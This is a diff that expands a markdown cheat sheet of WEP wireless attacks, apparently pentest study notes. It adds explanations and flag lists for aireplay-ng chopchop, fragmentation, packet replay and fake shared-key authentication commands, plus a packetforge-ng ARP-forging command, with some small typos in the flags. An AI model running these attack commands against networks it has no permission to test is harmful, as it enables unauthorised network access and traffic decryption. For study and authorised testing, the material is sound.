@@ -144,19 +144,60 @@ The Interactive Packet Replay attack allows you to choose a specific packet for 
 * `-n <num> - Maximum packet size`
 
 #### KoreK chopchop attack
+
+The Korek chopchop attack, when successful, can decrypt a WEP data packet without knowing the WEP key and can even work against dynamic WEP.  
+
+This attack does not recover the WEP key itself; it merely reveals the plaintext of the packets.
+
 > `aireplay-ng -4 -b <ap> -h <you> <interface>`
 
+* `-4 - KoreK ChopChop Attack`
+* `-b <ap> - The AP MAC address`
+* `-h <you> - The source MAC address
+
 #### Fragmentaion Attack
+
+This attack works by obtaining a small amount of the keying material from the packet and then attempts to send ARP and/or LLC packets with known content to the AP.  If the packet is successfully echoed back by the AP, then a larger amount of the keying information can be obtained from the returned packet.  This process is repeated until 1500 bytes of the PRGA are obtained.
 > `aireplay-ng -5 -b <ap> -h <you> <interface>`
 
+* `-5 - The Fragmentation Attack`
+* `-b <ap> - The AP MAC address`
+* `-h <you> - Source MAC address`
+
 #### Craft ARP Request Packet**
+
+Packetforge-ng is used to create encrypted packets that can later be used for injection.  You can create various types of packets such as UDP and ICMP packets although it is most commonly used to create ARP requests for subsequent injection.
 > `packetforge-ng -0 -a <ap> -h <you> -l <sourceIP> -k <destIP> -y <xorFile> -w <out>`
 
-#### Inject Packet**
+* `-0 - Generate an ARP request packet`
+* `-a <ap> - The AP MAC Address`
+* `-h <you> - The source MAC address`
+* `-k <distIP> - The destination IP`
+* `-l <sourceIP> - The source IP`
+* `-y <xorFile> - The PRGA filename`
+* `-w - The filename to save the packet to`
+
+#### Inject Packet/Interactive Packet Replay
+
+This attack uses a crafted ARP request packet and injects it to capture enough IVs to subsequently crack the WEP key on the AP
+
 > `aireplay-ng -2 -r <packet> <interface>`
 
+* `-2 - Interactive Packet Replay Attack`
+* `-r <packet> - Filename of the crafted ARP packet`
+
 #### Fake Shared Key Authentication
+
+This attack is used for bypassing WEP Share Key Authentication.  It uses a captured keystream file and conducts a fake authentication.
+
 > `aireplay -1 -0 -e <essid> -y <captureFile> -a <ap> -h <you> <interface>`
+
+* `-1 - Fake Authentication Attack`
+* `0 - Reassociation timing in seconds`
+* `-e <essid> - The wireless network name(SSID)`
+* `-y <captureFile> - Filename of the captured keystream`
+* `-a <ap> - The AP MAC address`
+* `-h <you> - Source MAC address`
 
 ## WPA Attacks
 
